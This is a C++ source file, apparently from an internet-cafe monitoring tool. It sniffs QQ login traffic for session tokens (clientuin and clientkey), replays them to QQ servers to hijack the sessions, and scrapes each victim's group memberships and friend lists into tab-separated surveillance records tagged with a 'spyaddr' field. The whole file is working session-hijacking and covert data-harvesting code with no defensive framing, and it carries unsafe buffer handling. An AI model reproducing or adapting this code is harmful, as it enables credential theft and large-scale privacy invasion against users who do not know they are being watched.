// QQGet.cpp: implementation of the CQQGet class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "QQGet.h"
#include <afxinet.h>
#include "http.h"
#include "HttpSession.h"
#include <map>

using namespace std;

#pragma comment(lib, "Wininet.lib")

map<CString,BOOL>	g_mapQQInfo;

static unsigned long g_staSeq = 1;
int	g_allaow[2];

CStringArray g_queueclientkey[2];
CStringArray g_queueclientuin[2];

DWORD WINAPI DealQQinfo(LPVOID p)
{
	g_allaow[0]=0;
	g_allaow[1]=0;
	int loopi=0;
	while (1)
	{
		if (g_allaow[0]==1)
		{
			for (int i=0;i<g_queueclientuin[0].GetSize();i++)
			{
				CQQInfo pInfo;
				pInfo.m_clientuin = g_queueclientuin[0].GetAt(i);
				pInfo.m_clientkey = g_queueclientkey[0].GetAt(i);
				CString strQun = pInfo.DumpQun();
				CString strFriend = pInfo.DumpFirend();
			}
			g_queueclientuin[0].RemoveAll();
			g_queueclientkey[0].RemoveAll();
			g_allaow[0]=0;
		}
		if (g_allaow[1]==1)
		{
			for (int i=0;i<g_queueclientuin[1].GetSize();i++)
			{
				CQQInfo pInfo;
				pInfo.m_clientuin = g_queueclientuin[1].GetAt(i);
				pInfo.m_clientkey = g_queueclientkey[1].GetAt(i);
				CString strQun = pInfo.DumpQun();
				CString strFriend = pInfo.DumpFirend();
				g_allaow[1]=0;
			}
			g_queueclientuin[1].RemoveAll();
			g_queueclientkey[1].RemoveAll();
			g_allaow[1]=0;
		}
		Sleep(1000);
		loopi++;
		if (loopi>60*1000)
		{
			pushdata("","");
		}
	}
	return 1;
}

BOOL pushdata(CString clientuin,CString clientkey)
{
	if (g_allaow[0]==0)
	{
		if (!clientkey.IsEmpty())
		{
			if (g_queueclientkey[0].GetSize()<200)
			{
				g_queueclientkey[0].Add(clientkey);
				g_queueclientuin[0].Add(clientuin);
			}
		}
		if (g_allaow[1]==0)
		{
			g_allaow[0]=1;
		}
	}
	if (g_allaow[1]==0)
	{
		if (!clientkey.IsEmpty())
		{
			if (g_queueclientkey[1].GetSize()<200)
			{
				g_queueclientkey[1].Add(clientkey);
				g_queueclientuin[1].Add(clientuin);
			}
		}
		if (g_allaow[0]==0)
		{
			g_allaow[1]=1;
		}

	}
	return TRUE;
}

void DealQQGet(DATEHEADER& dataheader,const char *pPacket)
{
int error=0;
	try
	{
		//Request URI: /mini/miniportal.zip?clientuin=909972432&clientkey=EECA9F2DD2AEF5E15B97DD44EBDFE1A4C08175DB8C2013D0399D22449F60EDEA&ptlang=2052&v=1&k=a05a27b6c4c81b97cb0f62bc89d15fb3
		char *pos1;
		char *pos2;
		pos1 = strstr(pPacket, "clientuin=");
		if(pos1 != NULL)
		{
error=1;
			CString clientuin;
			CString clientkey;
			pos2 = strstr(pos1, "&");
			if(pos2 != NULL)
			{
				if (pos2-pos1-strlen("clientuin=")<=5)
				{
					return ;
				}
error=11;
				clientuin = CString(pos1+strlen("clientuin="), pos2-pos1-strlen("clientuin="));
			}

			pos1 = strstr(pPacket, "clientkey=");
			if(pos1 != NULL)
			{
				pos2 = strstr(pos1, "&");
				if(pos2 != NULL)
				{
					int packlen=strlen(pPacket);
					if(pos2-pos1-strlen("clientkey=")<64)
					{
						return ;
					}
	error=2;
					clientkey = CString(pos1+strlen("clientkey="), 64);
				}
				error=11;
error=12;
				DWORD uid = atol(clientuin);
				if (uid > 10000)
					clientuin.Format("%u", uid);
				else
					return;

				if(clientkey.GetLength() == 64 && clientuin.GetLength() > 5)
				{
					map<CString,BOOL>::iterator It;
					It = g_mapQQInfo.find(clientuin);
					if(It == g_mapQQInfo.end())
					{
error=3;				
						WriteLog(HTTPPRO, "pushdata, clientuin=%s!!", clientuin);
						pushdata(clientuin,clientkey);
						g_mapQQInfo[clientuin]=1;
					}
					if (g_mapQQInfo.size()>1000)
					{
						g_mapQQInfo.clear();
					}
				}
			}
		}
	}
	catch (...)
	{
		WriteLog(HTTPPRO, "DealQQGet() Error, %d!!", error);
	}

}


//////////////////////////////////////////////////////////////////////////
//
CQQInfo::CQQInfo()
{
	
}

CQQInfo::~CQQInfo()
{
	map<CString,sQQGroup*>::iterator It;
	for(It = m_qqgroup.begin(); It != m_qqgroup.end(); It++)
	{
		delete It->second;
	}
	m_qqgroup.clear();

	for(It = m_qqfriend.begin(); It != m_qqfriend.end(); It++)
	{
		delete It->second;
	}
	m_qqfriend.clear();
}

CString CQQInfo::DumpQun()
{
int error=0;
	CString result, resultbcp;
	try
	{
error=111;
	CString strUrl;
	strUrl.Format("http://ptlogin2.qq.com/group2?ptlang=2052&clientuin=%s&clientkey=%s&type=0",
		m_clientuin, m_clientkey);
error=112;
	CInternetSession session("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
	CHttpFile* pfile=NULL;
	try
	{
		CStdioFile* tmpcsf=session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
		if (tmpcsf!=NULL)
		{
			pfile = (CHttpFile *)tmpcsf;
		}
		else
		{
			return "";
		}
	}
	catch (...)
	{
		return "";
	}

//	CHttpFile* pfile = (CHttpFile *)session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
error=113;
	pfile -> Close();
	delete pfile;	
error=1;
	DWORD dwStatusCode;
	strUrl.Format("http://qun.qq.com/air/group/mine?w=a&_=0.274140995641427");
	try
	{
		pfile = (CHttpFile *)session.OpenURL(strUrl, 1, INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
	}
	catch (...)
	{
		return "";
	}
	pfile -> QueryInfoStatusCode(dwStatusCode);
	if(dwStatusCode == HTTP_STATUS_OK)
	{
		BOOL bLine=FALSE;
		CString data;
		while (pfile -> ReadString(data))
		{
error=2;
			GetGroupInfo(data);
		}
	}
	pfile->Close();
	delete pfile;
	session.Close();

	char onebuf[10240];
	int onelen = 0;

// 文件名 QQ群 
// 时间(14位)_netbar_qqgroup_当前线程ID_序列号.tablefile.bcp	
// 群号\t群名称\tQQ号\t昵称\tQQ身份\t网吧ID\r\n
// 	char dstdir[MAX_PATH];
// 	int dstlen = 0;
// 	memset(dstdir,0,MAX_PATH);
// 	char WindowPath[MAX_PATH];
	SYSTEMTIME now;
	GetLocalTime(&now);
// 	memset(WindowPath,0,MAX_PATH);
// 	GetWindowsDirectoryA(WindowPath, MAX_PATH);
// 	dstlen = sprintf(dstdir,"%s\\Temp\\other\\imsg_oicq\\%04d%02d%02d%02d%02d%02d_netbar_qqgroup_%u_%u.tablefile.bcp", 
// 		WindowPath, 
// 		now.wYear, now.wMonth, now.wDay, now.wHour, now.wMinute, now.wSecond,
// 		GetCurrentThreadId(), g_staSeq++);
error=3;
	CString tt, tta, ttb;
	SYSTEMTIME st;
	GetLocalTime(&st);
	CString tm;
	tm.Format("%04u-%02u-%02u %02u:%02u:%02u",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);	
	map<CString,sQQGroup*>::iterator It;
	map<CString,CString>::iterator Ita;
	for(It = m_qqgroup.begin(); It != m_qqgroup.end(); It++)
	{
		onelen += sprintf(onebuf+onelen, "群: %s, 群名:%s, 成员如下:\r\n", It->second->groupid, It->second->groupname);
		for(Ita = It->second->qq2name.begin(); Ita != It->second->qq2name.end(); Ita++)
		{
			onelen += sprintf(onebuf+onelen, "%s, %s\r\n", Ita->first, Ita->second);
			if(onelen > 10000)
			{
				result = onebuf;
				onelen = 0;
			}

			tta = Ita->second;
			int ifind = tta.Find('_');
			if(ifind != -1)
			{
				ttb = tta.Mid(ifind+1);		/// 昵称
				tta = tta.Left(ifind);		/// 角色
			}
			else
			{
				ASSERT(FALSE);
				ttb = tta;
				tta = "群成员";
			}
		tt.Format("%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t"
				"%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t"
				"%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\r\n",
				"qqgroup",
				It->second->groupid,//群id
				"imsg_oicq",
				tm,
				"",
				"",
				"",
				"",
				"",
				Ita->first,//本qq号
				"",
				"",
				"",
				"",
				"",
				"",
				"",
				"",
				"",
				"",
				"fyy",
				v_ddelist.spyaddr,
				"",
				"",
				"",
				It->second->groupname,//群名称
				ttb,//昵称
				tta//QQ身份
			   );
//  			tt.Format("%s\t%s\t%s\t%s\t%s\t%s\r\n", 
//  				It->second->groupid, It->second->groupname, 
//  				Ita->first, ttb, tta, v_ddelist.spyaddr);
			resultbcp += tt;
		}
		onelen += sprintf(onebuf+onelen, "\r\n");
	}
	if(onelen > 0)
		result += onebuf;
error=4;
	//WriteArrToData(IMSG_PROTOCOL, WEBID_DATA, resultbcp);
	CStringArray aatmp;
	aatmp.Add(resultbcp);
	WriteQQGroup(aatmp);

	} catch (...) {
		result.Empty();
		WriteLog(HTTPPRO, "DumpQun() Error, %d!!", error);

	}

	return result;
}

void Split(const CString str ,CStringArray &array, const CString sep)
{
	char *t=new char[str.GetLength()+1];
	memcpy(t,(LPCSTR)str,str.GetLength()+1);
	char *tmpstr=t;
	const char *ep=(LPCSTR)sep;
	int mm=sep.GetLength();

	while (tmpstr != NULL)
	{
		char *tp1 = strstr(tmpstr, ep);
		if (tp1 != NULL)
		{
			*tp1 = 0;
			tp1+=mm;
			array.Add(tmpstr);
		}
		else
		{
			array.Add(tmpstr);
		}
		tmpstr = tp1;
	}

	delete []t;
} 

CString ConvUtf(LPCTSTR strMessage)
{
	WCHAR *wcTemp = NULL;
	char *MultiBute = NULL;
	CString strRest="";
	
	try	{
		int  i=  MultiByteToWideChar  (  CP_UTF8  ,  0  , strMessage , -1  , NULL , 0 );
		if( i == 0 )
			return "";
		
		wcTemp  =  new  WCHAR[i+2];  
		memset(wcTemp, 0, (i+2)*2 );
		if(MultiByteToWideChar  (  CP_UTF8  ,  0  ,strMessage,  -1,  wcTemp  ,  i) == 0 )
		{
			delete []wcTemp;  
			return "";
		}
		
		i=  WideCharToMultiByte(CP_ACP, 0, wcTemp, -1, NULL, 0, NULL, NULL); 
		if( i == 0 )
		{
			delete []wcTemp;  
			return "";
		}
		
		MultiBute = new char[i + 100];
		memset(MultiBute, 0, i + 100);
		if(WideCharToMultiByte  (CP_ACP, 0, wcTemp, -1, MultiBute, i, NULL, NULL ) != 0 ) 
			strRest = MultiBute;
		
		delete []MultiBute;
		delete []wcTemp;

	}catch(...)	{
		strRest.Empty();
	}
	
	return strRest;
}

CString Unicode2Gb(char* buf)
{
	char   sz[1024];   
	WideCharToMultiByte(   CP_ACP,   0,   (unsigned short*)buf,   -1,   sz,   512,   NULL,   NULL   );

	return sz;
}

CString UrlDecode(char* src)
{
	char buf[200]={0};
	int buflen=0;

    int srclen = strlen(src);

    for (size_t i = 0; i < srclen;)
    {
        if (src[i] == '\\' && src[i+1]=='u')
        {
     //       if(isxdigit(src.GetAt(i + 2)) && isxdigit(src.GetAt(i + 3)) && isxdigit(src.GetAt(i + 4)) && isxdigit(src.GetAt(i + 5)))
            {
				int aa, bb;
				char temp[1];
				memcpy(temp, src+i+2, 1);
				
				sscanf(src+i+2, "%02x%02x", &aa, &bb);

				*(buf+buflen)=bb;
				*(buf+buflen+1)=aa;
                buflen+=2;

				i+=6;
            }
        }
        else
		{
		//	memcpy(buf+buflen, (src.GetAt(i)), 1);
			*(buf+buflen) = src[i];
			*(buf+buflen+1) = 0;
			buflen+=2;
			i++;
		}
    }

    return Unicode2Gb(buf);
}



void CQQInfo::GetGroupInfo(CString data)
{
int error=0;
	try
	{
		int pos = -1;
error=1;
		//////////////////////////////////////////////////////////////////////////
		// 自身信息
		pos = data.Find("\"user\":{");
		if (pos>=0)
		{
			CString strUserInfo = data.Mid(pos+8);
			pos = strUserInfo.Find('}');
			if (pos>=0)
			{
				strUserInfo = strUserInfo.Left(pos);
				CStringArray infoArr;
				Split(strUserInfo, infoArr, ',');
				for (int i=0; i<infoArr.GetSize(); i++)
				{
					pos = infoArr[i].Find(':');
error=2;
					if(pos>=0)
					{
						CString tempName=infoArr[i].Left(pos);
						CString tempValue=infoArr[i].Mid(pos+1);
						tempName.TrimRight('\"');
						tempName.TrimLeft('\"');
						tempValue.TrimLeft('\"');
						tempValue.TrimRight('\"');
						if (tempName.CompareNoCase("id")==0)
						{
	#ifdef _DEBUG
							ASSERT(m_clientuin.Compare(tempValue) == 0);
	#endif
						}
error=3;
						if(tempName.CompareNoCase("nick")==0)
						{
							m_clientnick = UrlDecode((char*)(LPCTSTR)tempValue);
						}
					}
				}
			}
		}
error=4;
		//////////////////////////////////////////////////////////////////////////
		//获取群组信息
		pos = data.Find("\"c\":{");
		if(pos>=0)
		{
			CString strGroupInfo = data.Mid(pos+5);

			CStringArray infoArr;
			Split(strGroupInfo, infoArr, "{\"g\":");

			CString token1, token2;
			CString groupid, groupname;
			int pos1, pos2;
			for(int iig = 0; iig < infoArr.GetSize(); iig++)
			{
				pos1 = infoArr[iig].Find(",\"ul");
				if(pos1 == -1)
					continue;
				groupid = CString(infoArr[iig], pos1);

				token1 = "\"name\":\"";
				pos1 = infoArr[iig].Find(token1);
				token2 = "\",\"option";
				pos2 = infoArr[iig].Find(token2);
				if(pos2>pos1 && pos1 > 0)
				{
					CString tt = infoArr[iig].Mid(pos1+token1.GetLength());
					groupname = CString(tt, pos2-pos1-token1.GetLength());
					groupname = UrlDecode((char*)(LPCTSTR)groupname);
				}
error=5;
				if(FALSE == groupid.IsEmpty() && FALSE == groupname.IsEmpty())
				{
					map<CString, sQQGroup*>::iterator It;
					It = m_qqgroup.find(groupid);
					if(It == m_qqgroup.end())
					{
						sQQGroup *pGroup = new sQQGroup;
						pGroup->groupid = groupid;
						pGroup->groupname = groupname;
						m_qqgroup[groupid] = pGroup;
error=51;
						DumpOneQun(groupid);
					}
					else
					{
						It->second->groupid = groupid;
						It->second->groupname = groupname;
					}
				}
	error=6;			
				groupid.Empty();
				groupname.Empty();
			}

		}

		return;
	}
	catch (...)
	{
		WriteLog(HTTPPRO, "GetGroupInfo() Error, %d!!", error);
	}
}

void CheckGroupLine(CHttpFile* pfile, CString data, sQQGroup *pGroup)
{
int error=0;
	try
	{
		/*标号*/
		if(data.Find("<tr ")>=0)
		{
			CString strNick, strId, strUrl, strSex, strTel, strEmail, strConfige;
error=1;
			//身份
			pfile->ReadString(data);				//<td>
			if(data.Find("<td>")<0)
				return ;
			pfile->ReadString(strConfige);
			strConfige.TrimRight();
			strConfige.TrimLeft();
			pfile->ReadString(data);				//</td>
			if(strConfige.IsEmpty()==FALSE)
			{
				pfile->ReadString(data);
			}
			if(data.Find("</td>")<0)
				return ;
error=2;
			//群昵称
			pfile->ReadString(data);				//<td>
			if(data.Find("<td>")<0)
				return ;
			pfile->ReadString(strNick);
			pfile->ReadString(data);				//</td>
			if(data.Find("</td>")<0)
				return ;
error=3;
			//QQ号码
			pfile->ReadString(data);				//<td>
			if(data.Find("<td>")<0)
				return ;
			pfile->ReadString(strId);
			pfile->ReadString(data);				//</td>
			if(data.Find("</td>")<0)
				return ;

error=4;
				
			if(strConfige.Find("admin.gif")>0)
			{
				strConfige = "创建者";
			}
			else if(strConfige.Find("manage.gif")>0)
			{
				strConfige = "管理员";
			}
			else
			{
				strConfige = "群成员";
			}
error=5;
			strNick.TrimLeft();
			strNick.TrimRight();
			strNick.TrimRight("</a>");
			int pos = strNick.ReverseFind('>');
			if(pos != -1)
				strNick = strNick.Mid(pos+1);
			strNick = ConvUtf(strNick);
			strNick.TrimRight("</a>");
error=6;
			strId.TrimLeft();
			strId.TrimRight();
			strId.TrimRight("</span>");
			strId.TrimLeft("<span class=\"fcgray\">");

			pGroup->qq2name[strId] = strConfige+"_"+strNick;
		}

	}
	catch (...)
	{
		WriteLog(HTTPPRO, "CheckGroupLine() Error, %d!!", error);
	}

}

void CQQInfo::DumpOneQun(CString GroupId)
{
int error=0;
	try
	{
		map<CString,sQQGroup*>::iterator It;
		It = m_qqgroup.find(GroupId);
		if(It == NULL)
		{
			return ;
		}
error=1;
		CString strUrl;
		strUrl.Format("http://qun.qq.com/air/%s/addr/index/type/1?w=n&_=0.851156497125088",
			GroupId);
		CInternetSession session("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
error=2;
		int allpage = 1;
		CHttpFile* pfile;
		try
		{
			pfile = (CHttpFile *)session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
		}
		catch (...)
		{
			return ;
		}
error=3;
		DWORD dwStatusCode;
		pfile -> QueryInfoStatusCode(dwStatusCode);
		if(dwStatusCode == HTTP_STATUS_OK)
		{
			BOOL bLine=FALSE;
			CString data;
			while (pfile -> ReadString(data))
			{
				int aa = data.Find("allpage=\"");
				if (aa > 0)
				{
					data = data.Mid(aa+9);
					aa = data.Find('\"');
					if(aa > 0)
					{
						data = data.Left(aa);
						if(FALSE == data.IsEmpty())
						{
							allpage = atoi(data);
						}
					}
					continue;
				}
error=4;
				CheckGroupLine(pfile, data, It->second);
			}
		}
error=5;
		pfile->Close();
		delete pfile;

error=6;
		for (int i=2; i<=allpage; i++)
		{
			strUrl.Format("http://qun.qq.com/air/%s/addr/index/type/1/p/%d?w=n&_=0.851156497125088",
				GroupId, i);
			try
			{
				pfile = (CHttpFile *)session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);

			}
			catch (...)
			{
				continue;	
			}
			if (pfile==NULL)
			{
				return;
			}
error=7;
			pfile -> QueryInfoStatusCode(dwStatusCode);
			if(dwStatusCode == HTTP_STATUS_OK)
			{
				BOOL bLine=FALSE;
				CString data;
				while (pfile -> ReadString(data))
				{
error=8;
					CheckGroupLine(pfile, data, It->second);
				}
			}
error=9;			
			pfile->Close();
			delete pfile;
		}
error=10;
		session.Close();
	}
	catch (...)
	{
		WriteLog(HTTPPRO, "DumpOneQun() Error, %d!!", error);
	}

}

CString CQQInfo::DumpFirend()
{
	CString result, resultbcp;
	try
	{

	CString strUrl;
	strUrl.Format("http://ptlogin2.qq.com/group2?ptlang=2052&clientuin=%s&clientkey=%s&type=0",
		m_clientuin, m_clientkey);

	CInternetSession session("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
	CHttpFile* pfile;
	try
	{
		pfile = (CHttpFile *)session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
	}
	catch (...)
	{
		return "";
	}
	pfile -> Close();
	delete pfile;	

	map<CString, sQQGroup*>::iterator It;
	strUrl.Format("http://base.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=%s",
		m_clientuin);
	pfile = (CHttpFile *)session.OpenURL(strUrl, 1,   INTERNET_FLAG_TRANSFER_ASCII|INTERNET_FLAG_NO_AUTO_REDIRECT|INTERNET_FLAG_NO_CACHE_WRITE);
	DWORD dwStatusCode;
	pfile -> QueryInfoStatusCode(dwStatusCode);
	if(dwStatusCode == HTTP_STATUS_OK)
	{
		BOOL bLine=FALSE;
		CString data;
		while (pfile -> ReadString(data))
		{
			CString strNick, strId, strGroupId;
		
			int pos = data.Find("\"uin\":");
			if(pos> 0)
			{

				strId = data.Mid(pos+6);
				strId.TrimRight(',');

				//"groupid":1,
				pfile->ReadString(data);
				pos = data.Find("\"groupid\":");
				if(pos<0)
					continue;
				strGroupId = data.Mid(pos+10);
				strGroupId.TrimRight(',');

				//"name":"蓝色炫影",
				pfile->ReadString(data);
				pos = data.Find("\"name\":");
				if(pos<0)
					continue;

				strNick=data.Mid(pos+7);
				strNick.TrimRight("\",");
				strNick.TrimLeft("\"");
				strNick = ConvUtf(strNick);

				It = m_qqfriend.find(strGroupId);
				if(It == m_qqfriend.end())
				{
					sQQGroup *pGroup = new sQQGroup;
					pGroup->groupid = strGroupId;
					pGroup->qq2name[strId] = strNick;
					m_qqfriend[strGroupId] = pGroup;
				}
				else
				{
					It->second->qq2name[strId] = strNick;
				}
			}
			else
			{
				CString id, name;
				pos = data.Find("\"gpid\":");
				if(pos > 0)
				{
					id = data.Mid(pos+7);
					id.TrimRight(',');
				
					pfile->ReadString(data);
					pos = data.Find("\"gpname\":");
					if(pos<0)
						continue;
					name = data.Mid(pos+9);
					name = ConvUtf((LPCTSTR)name);
					name.TrimRight("\"]),{;}");
					name.TrimLeft("\"");

					It = m_qqfriend.find(id);
					if(It != m_qqfriend.end())
					{
						It->second->groupname = name;
					}
				}
			}
		}
	}

 	pfile->Close();
 	delete pfile;

//	QQ好友信息：
//	本QQ号\t本QQ的昵称\t好友QQ号\t好友昵称\t好友分组\t网吧ID\r\n
//	时间(14位)_netbar_qqfriend_当前线程ID_序列号.tablefile.bcp
	char dstdir[MAX_PATH];
	int dstlen = 0;
	memset(dstdir,0,MAX_PATH);
	char WindowPath[MAX_PATH];
	SYSTEMTIME now;
	GetLocalTime(&now);
	memset(WindowPath,0,MAX_PATH);
	GetWindowsDirectoryA(WindowPath, MAX_PATH);
	dstlen = sprintf(dstdir,"%s\\Temp\\other\\imsg_oicq\\%04d%02d%02d%02d%02d%02d_netbar_qqfriend_%u_%u.tablefile.bcp", 
		WindowPath, 
		now.wYear, now.wMonth, now.wDay, now.wHour, now.wMinute, now.wSecond,
		GetCurrentThreadId(), g_staSeq++);
	CString tt, tta, ttb;
	char onebuf[10240];
	int onelen = 0;
	SYSTEMTIME st;
	GetLocalTime(&st);
	CString tm;
	tm.Format("%04u-%02u-%02u %02u:%02u:%02u",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);	

	map<CString,CString>::iterator Ita;
	for(It = m_qqfriend.begin(); It != m_qqfriend.end(); It++)
	{
		onelen += sprintf(onebuf+onelen, "分组: %s, 成员如下:\r\n", It->second->groupname);
		for(Ita = It->second->qq2name.begin(); Ita != It->second->qq2name.end(); Ita++)
		{
			onelen += sprintf(onebuf+onelen, "%s, %s\r\n", Ita->first, Ita->second);
			if(onelen > 10000)
			{
				result = onebuf;
				onelen = 0;
			}
			tt.Format("%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t"
			"%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t"
			"%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\r\n",
			"qqfriend",
			m_clientuin,//本qq号
			"imsg_oicq",
			tm,
			"",
			"",
			"",
			"",
			"",
			Ita->first,//好友id
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"",
			"netbar",
			v_ddelist.spyaddr,
			"",
			"",
			"",
			m_clientnick,//本qq昵称
			Ita->second,//好友昵称
			It->second->groupname//群名称
		   );
//  			tt.Format("%s\t%s\t%s\t%s\t%s\t%s\r\n", 
// 				m_clientuin, m_clientnick, Ita->first, Ita->second, It->second->groupname,g_WBNo);
			resultbcp += tt;
		}
		onelen += sprintf(onebuf+onelen, "\r\n");
	}
	if(onelen > 0)
		result += onebuf;

	if(resultbcp.GetLength() > 0)
	{
		WriteArrToData(IMSG_PROTOCOL, WEBID_DATA, resultbcp);

//		WriteCyFile(dstdir, resultbcp, resultbcp.GetLength());

	}

	} catch (...) {
		result.Empty();
	}

	return result;
}